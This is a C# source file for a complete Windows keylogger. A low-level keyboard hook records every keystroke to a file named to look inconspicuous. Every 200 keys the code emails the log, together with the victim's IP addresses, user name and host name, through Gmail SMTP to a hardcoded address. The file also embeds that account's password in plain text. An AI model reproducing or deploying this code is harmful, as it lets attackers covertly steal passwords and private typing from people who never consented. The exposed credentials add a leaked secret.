using System;
using System.Runtime.InteropServices; //import DLL, used to read keystrokes
using System.Diagnostics; //for hooks
using System.Windows.Forms; //running app and converting keys
using System.IO;
using System.Net;
using System.Net.Mail;

namespace Keylogger01
{
    class KeyLogger
    {
        private static int WH_KEYBOARD_LL = 13; //hook monitoring low-level keyboard input events
        private static int WM_KEYDOWN = 0x0100; //posted to the window with keyboard, when nonsystem key is pressed
        private static IntPtr hook = IntPtr.Zero; //type used to represent pointer or handle
        private static LowLevelKeyboardProc llkProcedure = HookCallback; //callback used everytime new keyboard input event before posted into thread input queue
        private static string name;
        private static int index;
        private static string fileName;
        static long numberOfKeystrokes = 0;

        public KeyLogger()
        {           
            name = "nenapadny";
            index = 1;
            fileName = name + "_" + index + ".txt";
            StreamWriter output = new StreamWriter(fileName, true); // dividing each run of keylogger, for fomatting or debbuging 
            output.WriteLine();
            output.Close();
        }
        public void start()
        {
            hook = SetHook(llkProcedure);   //Defining our hook
            Application.Run();              // Main loop
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                StreamWriter output = new StreamWriter(fileName, true);
                String vkCodeS = ((Keys)vkCode).ToString();
                switch (vkCodeS)
                {
                    case "OemPeriod":
                        Console.Out.Write(".");
                        output.Write(".");
                        output.Close();
                        break;
                    case "Oemcomma":
                        Console.Out.Write(",");
                        output.Write(",");
                        output.Close();
                        break;
                    case "Space":
                        Console.Out.Write(" ");
                        output.Write(" ");
                        output.Close();
                        break;
                    default:
                        Console.Out.Write((Keys)vkCode);
                        output.Write((Keys)vkCode);
                        output.Close();
                        break;
                }
                numberOfKeystrokes++;
                //send message every 200 characters
                if(numberOfKeystrokes % 200 == 0)
                {
                    sendNewMessage();
                }
                
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) //creating hook
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName); //imported function kernel32.dll
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0); //imported funciton user32.dll, build it and return
        }

        static void sendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + fileName;
            String logContents = File.ReadAllText(fileName);
            string emailBody = "";

            //create email message

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList) //PC can have more ipAdresses
            {
                emailBody += " Address: " + address;
            }

            emailBody += "\nUser: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost: " + host.HostName;
            emailBody += "\ntime: " + now.ToString();
            emailBody += "\n" + logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); //587 gmail gateway
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("pvbpsroman@gmail.com");
            mailMessage.To.Add("pvbpsroman@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("pvbpsroman@gmail.com", "Silneheslojakpes");
            mailMessage.Body = emailBody;
            client.Send(mailMessage);

        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam); //imported function user32.dll

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
